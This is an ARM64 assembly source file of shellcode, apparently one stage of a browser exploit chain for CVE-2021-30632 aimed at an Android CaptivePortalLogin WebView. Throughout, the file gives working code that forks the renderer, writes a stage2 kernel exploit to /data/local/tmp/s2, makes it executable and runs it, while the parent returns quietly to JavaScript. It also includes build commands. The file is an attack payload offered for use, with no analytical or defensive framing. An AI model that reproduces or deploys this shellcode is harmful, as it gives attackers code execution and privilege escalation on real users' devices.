/*
 * shellcode_arm64.S — ARM64 shellcode for CVE-2021-30632 exploit delivery
 *
 * Purpose: Fork the renderer process, write stage2 kernel exploit to disk,
 *          and execute it. Parent process returns cleanly to JavaScript.
 *
 * Called from: WASM RWX page (replaces WASM function code)
 * Context: CaptivePortalLogin WebView renderer process (Android 9)
 *
 * Data layout at end of shellcode (filled by JavaScript before execution):
 *   _data+0:  stage2_addr  (u64) — address of stage2 binary in process memory
 *   _data+8:  stage2_len   (u64) — length of stage2 binary in bytes
 *   _data+16: path string  "/data/local/tmp/s2\0"
 *
 * Build: clang -target aarch64-linux-gnu -c shellcode_arm64.S -o shellcode.o
 *        llvm-objcopy -O binary -j .text shellcode.o shellcode.bin
 *
 * AArch64 Linux syscall numbers:
 *   __NR_fchmodat = 53
 *   __NR_openat   = 56
 *   __NR_close    = 57
 *   __NR_write    = 64
 *   __NR_exit     = 93
 *   __NR_clone    = 220
 *   __NR_execve   = 221
 */

.text
.global _start
.align 2

_start:
    /* Save frame pointer and link register (for parent return) */
    stp     x29, x30, [sp, #-16]!
    mov     x29, sp

    /* Load data section address (PC-relative) */
    adr     x9, _data
    ldr     x10, [x9, #0]          /* x10 = stage2_addr */
    ldr     x11, [x9, #8]          /* x11 = stage2_len */
    add     x12, x9, #16           /* x12 = &path_string */

    /* fork() via clone(SIGCHLD, 0, 0, 0, 0) */
    mov     x0, #17                /* SIGCHLD */
    mov     x1, xzr
    mov     x2, xzr
    mov     x3, xzr
    mov     x4, xzr
    mov     x8, #220               /* __NR_clone */
    svc     #0

    /* Parent gets child pid (>0), child gets 0 */
    cbnz    x0, .Lparent

    /* ===== CHILD PROCESS ===== */

    /* openat(AT_FDCWD, path, O_WRONLY|O_CREAT|O_TRUNC, 0755) */
    movn    x0, #99                /* AT_FDCWD = -100 */
    mov     x1, x12                /* pathname */
    mov     x2, #0x241             /* O_WRONLY(1) | O_CREAT(0x40) | O_TRUNC(0x200) */
    mov     x3, #0x1ed             /* 0755 octal = 0x1ED */
    mov     x8, #56                /* __NR_openat */
    svc     #0

    /* Check for open error */
    cmp     x0, #0
    blt     .Lexit_fail
    mov     x13, x0                /* x13 = fd */

    /* Write loop — write stage2 binary data to file */
    mov     x14, x10               /* x14 = current write pointer */
    mov     x15, x11               /* x15 = remaining bytes */

.Lwrite_loop:
    cbz     x15, .Lwrite_done
    mov     x0, x13                /* fd */
    mov     x1, x14                /* buf */
    mov     x2, x15                /* count */
    mov     x8, #64                /* __NR_write */
    svc     #0

    cmp     x0, #0
    ble     .Lwrite_err            /* error or 0 bytes written */

    add     x14, x14, x0           /* advance pointer by bytes written */
    sub     x15, x15, x0           /* decrease remaining */
    b       .Lwrite_loop

.Lwrite_done:
    /* close(fd) */
    mov     x0, x13
    mov     x8, #57                /* __NR_close */
    svc     #0

    /* fchmodat(AT_FDCWD, path, 0755, 0) */
    movn    x0, #99                /* AT_FDCWD */
    mov     x1, x12                /* pathname */
    mov     x2, #0x1ed             /* 0755 */
    mov     x3, xzr
    mov     x8, #53                /* __NR_fchmodat */
    svc     #0

    /* execve(path, [path, NULL], NULL) */
    sub     sp, sp, #16
    str     x12, [sp, #0]          /* argv[0] = path */
    str     xzr, [sp, #8]          /* argv[1] = NULL */
    mov     x0, x12                /* pathname */
    mov     x1, sp                 /* argv */
    mov     x2, xzr                /* envp = NULL */
    mov     x8, #221               /* __NR_execve */
    svc     #0

    /* If execve fails, fall through to exit */

.Lwrite_err:
    /* close fd before exit */
    mov     x0, x13
    mov     x8, #57                /* __NR_close */
    svc     #0

.Lexit_fail:
    mov     x0, #1
    mov     x8, #93                /* __NR_exit */
    svc     #0

.Lparent:
    /* Parent: restore frame and return to JavaScript */
    /* Return 42 to match WASM function's expected return value */
    ldp     x29, x30, [sp], #16
    mov     w0, #42
    ret

/* Data section — filled by JavaScript exploit before shellcode execution */
.align 3
_data:
    .quad   0                      /* +0x00: stage2_addr (filled by JS) */
    .quad   0                      /* +0x08: stage2_len  (filled by JS) */
_path:
    .asciz  "/data/local/tmp/s2"
    .align  2                      /* Realign for safety */
